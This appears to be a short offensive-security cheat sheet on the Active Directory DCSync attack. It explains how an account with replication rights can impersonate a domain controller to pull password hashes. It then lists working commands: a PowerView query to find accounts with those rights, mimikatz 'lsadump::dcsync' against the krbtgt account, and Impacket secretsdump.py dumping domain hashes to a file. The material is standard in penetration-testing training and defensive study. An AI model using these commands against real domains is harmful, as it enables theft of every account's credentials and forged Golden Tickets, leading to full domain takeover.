# Overview
>In production environments, domains typically rely on more than one domain controller to provide redundancy. The _Directory Replication Service_ (DRS) Remote Protocol uses _replication_ to synchronize these redundant domain controllers. A domain controller may request an update for a specific object, like an account, using the _IDL_DRSGetNCChanges_ API.
>Luckily for us, the domain controller receiving a request for an update does not check whether the request came from a known domain controller. Instead, it only verifies that the associated SID has appropriate privileges. If we attempt to issue a rogue update request to a domain controller from a user with certain rights it will succeed.
>To launch such a replication, a user needs to have the _Replicating Directory Changes_, _Replicating Directory Changes All_, and _Replicating Directory Changes in Filtered Set_ rights. By default, members of the _Domain Admins_, _Enterprise Admins_, and _Administrators_ groups have these rights assigned.
>If we obtain access to a user account in one of these groups or with these rights assigned, we can perform a _dcsync_ attack in which we impersonate a domain controller. This allows us to request any user credentials from the domain.
>This can be used by attackers to get any account’s NTLM hash including the KRBTGT account, which enables attackers to create Golden Tickets.

# Exploit
- Find a user that has the rights (_above_)
```powershell
Get-ObjectAcl -DistinguishedName "dc=fcorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}

# if the user has the necessary rights :
lsadump::dcsync /domain:<domain> /user:<user>
# FOR EXAMPLE:
lsadump::dcsync /domain:fcorp.local /user:krbtgt

# with powerview
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'


# LINUX
# Find the user that has the rights
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
```